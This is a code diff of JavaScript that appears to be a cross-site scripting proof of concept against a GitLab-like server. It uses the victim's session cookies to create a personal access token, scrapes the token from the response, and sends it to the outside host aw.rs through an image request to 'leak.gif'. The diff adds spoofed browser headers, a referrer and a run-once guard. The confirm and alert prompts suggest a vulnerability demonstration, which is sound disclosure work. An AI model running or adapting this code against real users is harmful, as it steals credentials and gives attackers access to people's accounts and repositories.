@@ -19,24 +19,29 @@ async function getToken() {
       credentials: "include",
       body: formData,
       headers: {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "en-US,en;q=0.9,sv-SE;q=0.8,sv;q=0.7",
         "content-type": "application/x-www-form-urlencoded"
       },
+        referrer: "https://65.52.77.188/-/profile/personal_access_tokens",
+  referrerPolicy: "strict-origin-when-cross-origin",
       method: "POST",
       mode: "cors"
     }
   )
-  
+ 
   const parser = new DOMParser();
   const doc = parser.parseFromString(await response.text(), "text/html");
 
   return doc.querySelector("#created-personal-access-token").value;
 }
 
-
+if(!donescript) {
+  var donescript=true;
 if (confirm("Create an access token?")) {
   getToken().then(token => {
     alert("Created token is: " + token);
     const image = new Image();
     image.src = `//aw.rs/g/leak.gif?token=${token}`;
   });
-}
+}}
